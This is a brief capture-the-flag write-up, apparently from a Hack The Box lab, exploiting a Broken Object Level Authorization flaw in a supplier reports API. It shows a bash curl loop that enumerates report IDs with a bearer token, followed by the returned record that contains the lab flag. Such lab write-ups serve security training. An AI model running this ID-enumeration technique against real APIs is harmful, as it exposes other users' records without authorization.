# [Broken Object Level Authorization](Broken%20Object%20Level%20Authorization.md)
### Exploit another Broken Object Level Authorization vulnerability and submit the flag.

![](Screenshot%202026-09-14%20at%2015.48.38.png)

![](Screenshot%202026-09-14%20at%2015.49.01.png)

![](Screenshot%202026-09-14%20at%2015.49.50.png)

```sh
for ((i=1; i<=20; i++)); do
  curl -s -w "\n" -X GET \
    "http://154.57.164.76:30865/api/v1/suppliers/quarterly-reports/$i" \
    -H 'accept: application/json' \
    -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjJAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiU3VwcGxpZXJDb21wYW5pZXNfR2V0WWVhcmx5UmVwb3J0QnlJRCIsIlN1cHBsaWVyc19HZXRRdWFydGVybHlSZXBvcnRCeUlEIl0sImV4cCI6MTc4OTM3ODkwMywiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.mbrrhBNhli-cj1hGTYpaVT87lkCc2uAPC_ovebULk15vTaua8DinCSX2ImUK3qkDF1uLt0eDaaS-AdjDSGF0Mw' | jq
done
```

```http
{
  "supplierQuarterlyReport": {
    "id": 8,
    "supplierID": "b2d1a1a9-d5bb-4973-bbe4-9a605b6f0da4",
    "quarter": 3,
    "year": 2023,
    "amountSold": 10000,
    "commentsFromManager": "HTB{e76651e1f516eb5d7260621c26754776}"
  }
}
```
